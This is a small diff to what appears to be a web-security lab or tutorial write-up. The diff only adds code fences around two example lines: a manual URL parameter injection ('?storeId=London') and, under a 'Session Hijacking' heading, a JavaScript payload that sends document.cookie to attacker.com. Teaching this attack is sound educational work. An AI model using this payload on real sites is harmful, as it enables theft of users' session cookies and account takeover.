@@ -1422,9 +1422,9 @@ Discovery:
 ### Step 4 — Inject Parameter Manually
 
 Append to URL:
-
+```
 ?storeId=London  
-
+```
 Result:
 
 - Application works normally  
@@ -1648,9 +1648,9 @@ Payload:
 ### 🔥 Session Hijacking
 
 Payload:
-
+```
 fetch("https://attacker.com?c="+document.cookie)  
-
+```
 Impact:
 
 → Steal session cookies  
